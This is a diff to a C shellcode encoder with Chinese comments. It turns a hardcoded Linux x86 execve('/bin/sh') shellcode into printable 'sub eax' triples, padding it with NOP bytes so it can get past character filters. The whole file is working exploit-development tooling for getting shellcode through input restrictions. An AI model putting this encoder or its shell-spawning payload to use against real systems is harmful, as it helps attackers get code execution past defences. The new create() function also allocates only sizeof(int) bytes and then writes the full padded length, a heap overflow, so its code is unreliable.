@@ -67,7 +67,7 @@ struct RESULT_BYTE * searchByte(unsigned char target, unsigned char LEFT, unsign
 					pointer = getMIN(&a, &b, &c);	
 					*pointer = *pointer + 1;
 				}else{
-					if (a < 20 || b < 20 || c < 20){
+					if (a < 0x20 || b < 0x20 || c < 0x20){
 						// 缠绕一圈
 						a += 85;
 				b += 85;
@@ -162,11 +162,29 @@ unsigned char * build(unsigned char *shellcode){
 
 char * create(char * shellcode){
 		int length = (strlen(shellcode) / 4 + 1) * 4;
+		// 第一步 : 申请 shellcode 补为 4 字节倍数的内存
+		char * result = malloc(sizeof(length)); // 应该是 24
+		// 第二部 : 设置为 0x90
+		memset(result, 0x90, length);
+		// 第三部 : 将shellcode逆序存放
 		int i = 0;
+		for(i = 0; i < strlen(shellcode); i ++){
+			result[i] = shellcode[strlen(shellcode) - 1 - i];
+			// printf("A : shellcode[%d] = [%2x] -> result[%d] = [0x%2x]\n", i, shellcode[i], length - i, result[length - i]);
+		}
+		unsigned int *pointer = NULL;
+		for (i = 0; i < length; i+=4){
+			/// printf("result[%d] = [0x%2x]\n", i, result[i]);
+			pointer = (int *)&result[i];
+			printf("pointer -> [%x]; result[%d] = [0x%2x]\n",*pointer, i, result[i]);
+
+		}
+		// 第二部 : 四字节取 , 取得之后 , 2**32 - number 得到 target
+		/*
 		unsigned int *target = NULL;
 		for (i = 0; i < strlen(shellcode); i += 4 ){
-				target = (int *)&shellcode[i];
-				printf("[Target] : %x\n", *target);
+			target = (unsigned int *)&result[i];
+			printf("[Target] : %x\n", *target);
 					
 			struct RESULT * result = search(*target);
 			printf("[Target] : 0x%x\n", *target);
@@ -175,15 +193,38 @@ char * create(char * shellcode){
 			printf("0x%x + 0x%x + 0x%x\n", result->result_a, result->result_b, result->result_c);
 			free(result);
 		}
+		*/
+}
 
-
-
+unsigned char * temp(char * shellcode){
+	int length_shellcode = strlen(shellcode);
+	int length_malloc = (length_shellcode / 4 + 1) * 4;
+	char * pointer = malloc(length_malloc);
+	memset(pointer, 0x90, length_malloc);
+	int i = 0;
+	for(i = 0; i < length_shellcode; i++){
+		pointer[i] = shellcode[length_shellcode - i - 1];	
+	}
+	int *target = (int *)pointer;
+	for (i = 0; i < (length_malloc / 4); i++){
+		printf("target[%d] -> [%x]\n", i, *target);
+		/* 开始算 */
+		search(*target);
+		struct RESULT * result = search(*target);
+		printf("[Target] : 0x%x\n", *target);
+		printf("[FOUND] : \n");
+		printf("[0x%x] [0x%x] [0x%x]\n", result->result_a, result->result_b, result->result_c);
+		printf("0x%x + 0x%x + 0x%x\n", result->result_a, result->result_b, result->result_c);
+		free(result);
+		/* 处理下四个字节 */
+		target++;
+	}
 }
 
 int main(){
-	// unsigned char shellcode[] = "\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x0b\x58\x99\xcd\x80"; // length = 21
-	//unsigned char shellcode[] = "\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x0b\x58\x99\xcd\x80\x00\x00\x00"; // length = 21
-	//unsigned char * result = create(shellcode);
+	unsigned char shellcode[] = "\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x0b\x58\x99\xcd\x80"; // length = 21
+
+	unsigned char * result = temp(shellcode);
 
 /*
  * >>> hex(0x100000000 - 0x80cd9958)[2:]
@@ -201,7 +242,7 @@ int main(){
  * >>> hex(0x100000000 - 0x90909090)[2:]
  * '6f6f6f70L'
  */
-
+/*
 	int target = 0x7f3266a8;
 //	int target = 0xf4951c77;
 //	int target = 0x91969dd1;
@@ -217,7 +258,7 @@ int main(){
 	printf("0x%x + 0x%x + 0x%x\n", result->result_a, result->result_b, result->result_c);
 	printf("sub eax, %xH\nsub eax, %xH\nsub eax, %xH\n", result->result_a, result->result_b, result->result_c);
 	free(result);
-
+*/
 }
 
 // 产生一个问题 :
